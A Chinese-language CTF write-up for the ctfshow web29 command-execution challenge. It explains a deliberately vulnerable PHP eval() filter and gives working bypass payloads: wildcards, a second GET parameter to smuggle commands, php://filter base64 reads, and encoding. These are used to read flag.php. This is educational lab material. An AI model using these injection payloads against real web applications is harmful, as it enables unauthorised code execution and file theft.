---
title: ctfshow-web-命令执行
description: web-wp
permalink: /2026/ctfshow-web-命令执行
date: 2026-11-1 10:15:00
updated: 2026-11-1 10:16:00
image:  /images/baopo/2.jpg
categories: [web]
tags: [web,命令执行]
---

---

## web29

### 读懂代码

```php
error_reporting(0);/*关闭报错，即使错了也不会显示的，防止我们靠报错信息探测*/
if(isset($_GET['c'])){/*检查url里头，有没有报错的参数C*/
    $c = $_GET['c'];/*把参数C赋值给变量$C*/
    if(!preg_match("/flag/i", $c)){/*用正则看有没有flag这四个字母*/
        eval($c);/*没有的话就把$C当作代码执行*/
    }
    
}else{
    highlight_file(__FILE__);/*没传参数c时就把,题目源码高亮显示出来给我们看*/
}
```

### 函数

| 函数       | 作用                                                         |
| ---------- | ------------------------------------------------------------ |
| preg_match | php的正则匹配函数，“/flag/i”表示寻找字符串“flag”,"i"表示不区分大小写，也就是说，flag,Flag,FLAG都算 |
| eval()     | 把字符串当代码执行的函数，危险函数之一，它执行的是php代码，而不是终端命令 |
### 思路（开始之前先弄清楚这些）

#### Q1:我们的目标是什么？

拿flag，flag肯定藏在某个文件里（ctf-web一贯这样），那会是哪个文件呢？大概叫flag.php,我为什么会猜这个？首先，flag.php在我信息搜集的文章中遇到过，算是常见的可能会藏有flag的文件名之一，其次，你看代码` if(!preg_match("/flag/i", $c))`用正则检验有没有flag这个字符串，必须要没有flag这个字符串才能走下一步，你猜它为什么不禁别的字符串，唯独禁flag？偏爱吗❤?那很爱了。

当然是因为，文件名包含这个字符串啊，只是我们没办法明着访问flag.php

#### Q2:有什么可以利用的？

eval()会执行我传入的任何不含flag的php代码，这正是可以利用的一点

#### Q3:障碍是什么？怎么绕？

障碍：我的http请求里不能出现flag这四个连续的字母，包括大写，但是难点就在于目标文件偏偏又叫flag.php,所以我们需要绕过，有两种绕过思路

- 1.命令里不写”flag“,但照样能读到它→通配符，字符串拼接，编码
- 2.”写flag“但不写在被检查的参数C里：题目只检查$_GET['C'],我们传另一个参数装payload,C里头只写一句中转代码

### 法一：通配符绕过（经典）

### 什么是通配符？

`*` 是 **Linux Shell 的通配符**（glob），它由 Shell 在执行前展开：`f*` 自动匹配当前目录下所有 `f` 开头的文件名，`flag.php` 正好命中。

```
?c=system('ls');
?c=system('cat f*')
```

**过滤发生在 PHP 层，通配展开发生在 Shell 层，过滤者根本看不到展开后的真名。**

直接在url里边访问

```
https://f85fae9f-....challenge.ctf.show/?c=system('ls');
```

![image-20261101112601374](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261101112601374.png)

先确认flag.php确实存在，再进行下一步

**这里特别要注意单引号要是直的，英文格式下的，不然界面可能会是空白，还有一点，最后的分号不能少**

如果写`?c=system('cat f*')`,界面可能是空白，需要ctrl+u查看源码才能看到flag

![image-20261101114359463](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261101114359463.png)

如果写`?c=system('tac f*')`,可以直接看到flag

![image-20261101114549378](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261101114549378.png)

#### Q:为什么cat tac 正着写和倒着写，显示的界面不一样？

 cat tac 两份输出的开头内容不一样，导致html解析器之后处理方式也不一样

浏览器渲染时，会扫描响应内容，遇到<就会进入“标签解析模式”：遇到`<?`开头，浏览器会把它当作一条注释开头，一直吞到下一个>为止，所以说，从`<?`到`>`的内容都不会在界面上显示，所以需要`ctrl+u`查看，刚巧,php的开始结尾就是`<?php ...?>`，看上边红字黑底的图片可知，这个文件没有？>,所以就一直从<?php吞到文件末尾,flag就显示不出来了

```php
<?php  /*从这里开始吞*/

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:14:07
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:14:17
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

$flag = 'ctfshow{33a9d6bd-fee1-40ee-9cc1-88067edd1015}'; /*由于没有结束标志`>`就一直吞到文件末尾，包括flag,所以flag无法显示*/
```



tac倒着输出就刚好是红字黑底那张图片中的代码倒过来

#### tac很巧妙

```php
$flag = 'ctfshow{33a9d6bd-fee1-40ee-9cc1-88067edd1015}';
*/
# @link: https://ctfer.com
# @email: h1xa@ctfer.com
...
# -*- coding: utf-8 -*-
/*
<?php /*从这里开始吞，完全不影响flag输出*/
```

### 法二：双参数中转

#### 为什么可以绕过？

 ` if(!preg_match("/flag/i", $c))`正则只检查$c这一个参数的值，其它参数没有被检查，那就可以传两个参数，第一个参数绕过检查（参数的值是第二个参数的名字，不含flag），检查只会检查到一个参数名，第二个参数放真正的flag文件名，并且用函数获取文件内容。

```
?c=system($_GET[1]);$1=tac flag.php
```

`?c=system($_GET[1]);`里边没有flag这个字符串，通过，执行eval

`$1=tac flag.php`里边写着flag但是，没人检查啊

![image-20261101122326876](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261101122326876.png)

```
?c=eval($_GET[1]);&1=system('tac flag.php');
```

这么写也可以

### 法三：include + php://filter 伪协议（经典）

这题的内容在php伪协议和base64过滤中详细解释了，信息搜集篇也有对include的解释，这里已经是第三次遇到了，具体内容就不做解释了

之前我们都是include作为题目内容，我们使用php伪协议，这里我们将include和php结合起来

```
?c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
```

得到的是base64编码的flag，找一些解码工具解码就行

![image-20261101123443608](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261101123443608.png)

### 法四：把flag藏进编码里

既然题目不给出现flag这个字符串，那我把它编码了，不明着出现不就好了，但是它还是flag这个意思

我把tac flag.php编码之后填入system中

![image-20261101124518736](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261101124518736.png)

![image-20261101124900727](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261101124900727.png)